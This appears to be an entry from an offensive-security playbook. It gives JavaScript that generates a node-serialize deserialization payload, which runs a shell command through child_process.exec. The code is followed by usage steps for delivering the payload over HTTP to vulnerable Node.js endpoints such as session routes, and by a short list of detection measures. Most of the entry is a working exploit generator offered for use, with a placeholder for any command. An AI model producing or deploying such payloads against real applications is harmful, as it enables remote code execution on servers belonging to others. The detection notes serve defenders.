---
id: 14b2d557-f82d-44e5-a330-4101eacaf131
type: code
name: Generate-Node-Serialize-RCE-Payload
language: js
verified: true
created_at: '2023-04-06T03:55:59.258946+00:00'
updated_at: '2023-04-06T03:55:59.262131+00:00'
tags:
  - rce
  - deserialization
  - node-serialize
platforms:
  - Node.js
validated: true
---

# Generate-Node-Serialize-RCE-Payload

## Code

```js
var y = {
    rce : function(){
        require('child_process').exec('ls /', function(error,
        stdout, stderr) { console.log(stdout) });
    },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

## Description

This JavaScript code defines an object with an 'rce' function that executes a system command ('ls /' by default) using Node.js's child_process module. It then serializes the object using the node-serialize library and prints the result to the console. The purpose is to generate a base serialized payload for deserialization exploitation, which can be modified and sent to a vulnerable Node.js application to trigger RCE.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `$COMMAND` | System command to execute (replace 'ls /' in the exec call) | `whoami` or `id` |

## Usage

Save this code to a file (e.g., generate-payload.js) and run it with Node.js: `node generate-payload.js`. Use the output serialized string as the base for modification in the next step of a deserialization attack procedure, such as [[procedures/Node-Deserialization-RCE-using-node-serialize]]. Deliver the final payload via HTTP requests to endpoints that deserialize user input, like session handling routes.

## Detection

- Monitor Node.js applications for use of node-serialize; audit and replace with safe serializers.
- Log child_process.exec calls and inspect arguments for unexpected commands.
- Network traffic analysis for unusual serialized payloads containing '_$$ND_FUNC$$_' patterns.
- Application logs showing deserialization errors or function executions from untrusted sources.

## Related

- [[procedures/Node-Deserialization-RCE-using-node-serialize]]
- [[tools/node-serialize]]
